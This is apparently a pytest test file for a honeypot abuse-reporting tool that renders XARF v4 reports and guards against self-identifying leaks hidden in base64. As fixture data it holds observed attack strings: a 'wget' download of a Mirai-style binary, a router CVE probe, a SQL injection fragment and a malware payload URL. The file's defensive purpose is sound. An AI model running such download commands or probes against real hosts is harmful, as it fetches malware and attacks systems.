"""XARF v4 renderer: mapping, schema validity, allow-lists and the guard's base64 view (M38)."""

from __future__ import annotations

import base64
import email
import json
import random
import uuid
from datetime import timedelta
from typing import Any

import pytest

from suckerpot_reporting import (
    Activity,
    Evidence,
    GuardContext,
    RenderUnavailable,
    ReportSettings,
    SampleRef,
    SelfTermRow,
    SelfTerms,
    Subject,
    guard,
    guard_message,
    load_self_terms,
    render_eml,
    render_mail,
    render_xarf_v4,
    schema_errors,
)
from suckerpot_reporting.xarf import (
    FORBIDDEN_KEYS,
    MALWARE_FAMILIES,
    SERVICE_TAGS,
    activity_class,
    tags_of,
)
from tests.conftest import (
    FAKE_HOST,
    SEED,
    SELF_ADDRESS,
    SETTINGS,
    make_activity,
    make_evidence,
    t,
)

PSEUDONYM = "quiet-heron-17"


def _subject(**kw: Any) -> Subject:
    base: dict[str, Any] = {
        "type": "ip",
        "value": "198.51.100.23",
        "first_ts": t(14, 2),
        "last_ts": t(15, 40),
        "sessions": 2,
        "events": 10,
        "xarf_id": uuid.uuid4(),
    }
    base.update(kw)
    return Subject.model_validate(base)


def _digest(*subjects: Subject) -> Evidence:
    return Evidence(
        kind="digest",
        recipient="abuse@example.net",
        subjects=subjects,
        window_start=t(14, 0),
        window_end=t(16, 0),
    )


def _one(evidence: Evidence, subject: Subject) -> dict[str, Any]:
    return render_xarf_v4(evidence, SETTINGS, subject)


LOGIN = _subject(
    kind="attack_source",
    activities=(make_activity(action="failed_logins", count=40, usernames=("root",)),),
)
COMMANDS = _subject(
    kind="attack_source",
    value="198.51.100.30",
    activities=(
        make_activity(src_ip="198.51.100.30", action="login_then_commands", text="uname -a"),
        make_activity(
            src_ip="198.51.100.30", action="download", text="wget http://203.0.113.9/x86"
        ),
    ),
)
EXPLOIT = _subject(
    kind="attack_source",
    value="198.51.100.31",
    activities=(
        make_activity(
            src_ip="198.51.100.31",
            action="exploit_attempt",
            dst_port=80,
            service="http",
            text="GET /cgi-bin/luci",
            user_agent="curl/8.0",
            cves=("cve-2023-1389",),
        ),
    ),
)
SQLI = _subject(
    kind="attack_source",
    value="198.51.100.32",
    activities=(
        make_activity(
            src_ip="198.51.100.32",
            action="exploit_attempt",
            dst_port=443,
            service="https",
            text="GET /item.php?id=1 union select",
            sqli=True,
        ),
    ),
)
SAMPLE = SampleRef(sha256="ab" * 32, kind="elf", arch="arm", family="mirai")
PAYLOAD = _subject(
    kind="payload_host",
    type="domain",
    value="files.example.org",
    activities=(make_activity(action="download", text="http://files.example.org/bins/arm7"),),
    samples=(SAMPLE,),
)
PAYLOAD_IP = _subject(kind="payload_host", value="203.0.113.9", samples=(SAMPLE,))
C2 = _subject(kind="c2", type="domain", value="c2.example.org", samples=(SAMPLE,))
C2_BARE = _subject(kind="c2", value="203.0.113.10")
ALL = (LOGIN, COMMANDS, EXPLOIT, SQLI, PAYLOAD, PAYLOAD_IP, C2, C2_BARE)


@pytest.mark.parametrize(
    ("subject", "category", "xtype"),
    [
        (LOGIN, "connection", "login_attack"),
        (COMMANDS, "connection", "login_attack"),
        (EXPLOIT, "connection", "vulnerability_scan"),
        (SQLI, "connection", "sql_injection"),
        (PAYLOAD, "content", "malware"),
        (PAYLOAD_IP, "content", "malware"),
        (C2, "infrastructure", "botnet"),
        (C2_BARE, "infrastructure", "botnet"),
    ],
)
def test_every_mapping_row_is_schema_valid(subject: Subject, category: str, xtype: str) -> None:
    report = _one(_digest(*ALL), subject)
    assert (report["category"], report["type"]) == (category, xtype)
    assert schema_errors(report) == []
    assert report["reporter"] == report["sender"]
    assert report["report_id"] == str(subject.xarf_id)
    assert len(report["description"]) <= 300
    assert FORBIDDEN_KEYS.isdisjoint(report)


def test_type_specific_fields() -> None:
    ev = _digest(*ALL)
    exploit = _one(ev, EXPLOIT)
    assert exploit["scan_type"] == "web_vuln_scan"
    assert exploit["vulnerabilities_probed"] == ["CVE-2023-1389"]
    assert exploit["user_agent"] == "curl/8.0" and exploit["total_requests"] == 1
    assert "cve:cve-2023-1389" in exploit["tags"] and "service:http" in exploit["tags"]
    sqli = _one(ev, SQLI)
    assert sqli["http_method"] == "GET" and sqli["attempts_count"] == 1
    assert "target_url" not in sqli  # a path only would not be a URI; it is in the evidence
    payload = _one(ev, PAYLOAD)
    assert payload["url"] == "http://files.example.org/bins/arm7"
    assert payload["domain"] == "files.example.org"
    assert payload["file_hashes"] == {"sha256": "ab" * 32}
    assert (
        payload["malware_family"] == "mirai" and payload["file_metadata"]["file_type"] == "elf-arm"
    )
    assert "source_port" not in payload  # the activities name the attackers, not the host
    assert _one(ev, PAYLOAD_IP)["url"] == "http://203.0.113.9/"
    assert "domain" not in _one(ev, PAYLOAD_IP)
    c2 = _one(ev, C2)
    assert c2["compromise_evidence"].startswith("A malware sample (sha256 abab")
    assert _one(ev, C2_BARE)["compromise_evidence"].startswith("A malware sample uses")


def test_exploit_wins_over_login_and_sqli_wins_over_exploit() -> None:
    both = _subject(
        kind="attack_source",
        activities=(
            make_activity(action="failed_logins", count=3),
            make_activity(action="exploit_attempt", service="http", dst_port=80, text="GET /x"),
        ),
    )
    assert activity_class("attack_source", both) == "exploit"
    worse = both.model_copy(
        update={"activities": (*both.activities, SQLI.activities[0].model_copy())}
    )
    assert activity_class("attack_source", worse) == "sqli"


def _random_subject(rng: random.Random) -> Subject:
    kind = rng.choice(["attack_source", "payload_host", "c2"])
    acts: list[Activity] = []
    for i in range(rng.randint(0, 6)):
        service = rng.choice([*SERVICE_TAGS, "synology", "tcp", "srv-db01"])
        acts.append(
            make_activity(
                ts=t(14, i),
                src_port=rng.choice([0, 1, 40000, 65535]),
                dst_port=rng.choice([0, 22, 80, 445]),
                protocol=rng.choice(["tcp", "udp"]),
                service=service[:32],
                action=rng.choice(
                    ["failed_logins", "command", "download", "exploit_attempt", "http_request"]
                ),
                text=rng.choice([None, "GET /", "wget http://203.0.113.9/a"]),
                cves=tuple(rng.sample(["cve-2021-44228", "cve-2017-0144"], rng.randint(0, 2))),
                sqli=rng.random() < 0.2,
            )
        )
    if kind == "attack_source":
        # the builder never puts an attack source without a usable source port in a mail
        acts.append(make_activity(ts=t(13, 59), src_port=40001))
    family = rng.choice(["mirai", "generic", "pack-2026-001", None, "srv-web01"])
    samples = (SampleRef(sha256="cd" * 32, family=family),) if rng.random() < 0.5 else ()
    return _subject(
        kind=kind,
        value=rng.choice(["198.51.100.40", "2001:db8::40", "203.0.113.41"]),
        activities=tuple(acts),
        samples=samples,
        first_ts=t(14, 0) - timedelta(minutes=rng.randint(0, 600)),
    )


def test_property_no_destination_ip_and_only_allow_listed_tags() -> None:
    rng = random.Random(4711)  # noqa: S311 - a reproducible test sequence
    allowed_prefixes = ("service:", "cve:cve-", "malware:")
    for _ in range(300):
        subject = _random_subject(rng)
        report = _one(_digest(subject), subject)
        text = json.dumps(report)
        assert "destination_ip" not in text and "evidence_source" not in text
        assert "confidence" not in report and "_internal" not in report
        assert schema_errors(report) == [], report
        for tag in report.get("tags", []):
            assert tag.startswith(allowed_prefixes), tag
            name = tag.split(":", 1)[1]
            if tag.startswith("service:"):
                assert name in SERVICE_TAGS
            if tag.startswith("malware:"):
                assert name in MALWARE_FAMILIES


def test_trap_pack_and_local_tags_never_appear() -> None:
    planted = _subject(
        kind="payload_host",
        value="203.0.113.50",
        activities=(make_activity(service="synology", action="download", text="x"),),
        samples=(SampleRef(sha256="ef" * 32, family="pack-2026-001"),),
    )
    report = _one(_digest(planted), planted)
    assert tags_of(planted) == []
    assert "tags" not in report and "pack-2026" not in json.dumps(report)
    assert "synology" not in json.dumps(report)


def test_report_id_is_random_stored_and_unrelated() -> None:
    ev = make_evidence()
    token = "0123456789ab"  # gitleaks:allow (a sample reply token)
    msg = render_mail(ev, SETTINGS, reply_token=token)
    data = json.loads(msg.attachments[0].content)
    assert data["report_id"] == str(ev.subjects[0].xarf_id)
    assert data["report_id"] not in (str(SEED), token)
    assert token not in json.dumps(data)
    ids = {str(_subject().xarf_id) for _ in range(50)}
    assert len(ids) == 50


def test_schema_errors_catch_a_broken_report() -> None:
    good = _one(_digest(LOGIN), LOGIN)
    assert schema_errors(good) == []
    assert "forbidden_key" in schema_errors({**good, "destination_ip": "203.0.113.77"})
    assert schema_errors({**good, "report_id": "not-a-uuid"})
    missing = dict(good)
    del missing["first_seen"]
    assert schema_errors(missing)
    assert schema_errors({**good, "type": "made_up"})


def test_invalid_report_blocks_the_mail() -> None:
    ev = make_evidence()
    broken = ev.subjects[0].model_copy(update={"first_ts": t(15, 0), "activities": ()})
    # a login attack from an address needs a source port: without one the schema refuses it
    with pytest.raises(RenderUnavailable) as exc:
        render_mail(ev.model_copy(update={"subjects": (broken,)}), SETTINGS)
    assert exc.value.code == "xarf_invalid"


# --- the guard sees base64 inside the JSON --------------------------------------------------


@pytest.fixture(scope="module")
def deny() -> SelfTerms:
    return load_self_terms(
        [SelfTermRow(kind="address", value=SELF_ADDRESS, source="manual")],
        {"WEB_HOSTNAME": FAKE_HOST, "NETWORK_PSEUDONYM": PSEUDONYM},
    )


LEAKS = [
    (f"node at {SELF_ADDRESS}", "self_address"),
    (f"signed {PSEUDONYM}", "self_name"),
    (f"host {FAKE_HOST} says hi", "self_name"),
    ("seen by our honeypot", "project_term"),
]


def _planted_report(secret: str) -> dict[str, Any]:
    report = _one(_digest(LOGIN), LOGIN)
    payload = base64.b64encode(f"source,time\r\n198.51.100.23,{secret}\r\n".encode()).decode()
    report["evidence"][0]["payload"] = payload
    return report


@pytest.mark.parametrize(("secret", "code"), LEAKS)
def test_base64_evidence_leak_is_caught(secret: str, code: str, deny: SelfTerms) -> None:
    report = _planted_report(secret)
    raw = json.dumps(report)
    assert secret not in raw  # only the base64 form is there
    ctx = GuardContext(allow_documentation=True)
    assert code in guard(raw, deny, fmt="json", ctx=ctx).codes
    assert code in guard(report, deny, ctx=ctx).codes


@pytest.mark.parametrize(("secret", "code"), LEAKS)
def test_base64_leak_in_any_json_value_is_caught(secret: str, code: str, deny: SelfTerms) -> None:
    hidden = base64.urlsafe_b64encode(secret.encode()).decode().rstrip("=")
    nested = base64.b64encode(base64.b64encode(secret.encode())).decode()
    ctx = GuardContext(allow_documentation=True)
    for value in (hidden, nested):
        doc = json.dumps({"description": "ok", "extra": {"x": [value]}})
        assert code in guard(doc, deny, fmt="json", ctx=ctx).codes, value


@pytest.mark.parametrize(("secret", "code"), LEAKS)
def test_base64_leak_in_the_mime_json_part_is_caught(
    secret: str, code: str, deny: SelfTerms
) -> None:
    msg = render_mail(make_evidence(), SETTINGS)
    planted = json.dumps(_planted_report(secret), indent=2) + "\n"
    files = tuple(
        type(a)(a.name, a.media_type, planted) if a.media_type == "application/json" else a
        for a in msg.attachments
    )
    bad = type(msg)(msg.to, msg.subject, msg.body, files, msg.layout, msg.feedback)
    ctx = GuardContext(allow_documentation=True)
    eml = render_eml(bad)
    assert secret.encode() not in eml
    assert code in guard(eml, deny, fmt="eml", ctx=ctx).codes
    assert code in guard_message(bad, deny, ctx=ctx).codes


def test_clean_mail_passes_with_the_base64_view(deny: SelfTerms) -> None:
    ctx = GuardContext(allow_documentation=True)
    for subject in ALL:
        ev = _digest(subject)
        msg = render_mail(ev, SETTINGS)
        assert guard_message(msg, deny, ctx=ctx).ok, subject.value
        assert guard(render_eml(msg), deny, fmt="eml", ctx=ctx).ok, subject.value
    digest = render_mail(_digest(*ALL), SETTINGS)
    assert digest.layout == "digest" and len(digest.xarf_files) == len(ALL)
    assert guard_message(digest, deny, ctx=ctx).ok
    parsed = email.message_from_bytes(render_eml(digest))
    assert [p.get_filename() for p in parsed.walk() if p.get_filename()][1:3] == [
        "xarf-001.json",
        "xarf-002.json",
    ]


def test_digest_text_has_a_section_per_kind() -> None:
    body = render_mail(_digest(*ALL), SETTINGS).body
    heads = [line for line in body.splitlines() if line.endswith(")") and "(" in line[:20]]
    assert heads[:3] == ["Attack sources (4)", "Payload hosts (2)", "Command servers (2)"]


def test_short_pseudonym_is_not_a_term() -> None:
    terms = load_self_terms([], {"NETWORK_PSEUDONYM": "ab"}, extra_texts=["xy", "far-owl"])
    assert terms.texts == ("far-owl",)


def test_feedback_user_agent_is_one_clean_line() -> None:
    cfg = ReportSettings(reply_contact="reports@example.org", xarf_user_agent="agent/1")
    msg = render_mail(make_evidence(), cfg)
    assert msg.feedback == "Feedback-Type: xarf\nUser-Agent: agent/1\nVersion: 1\n"
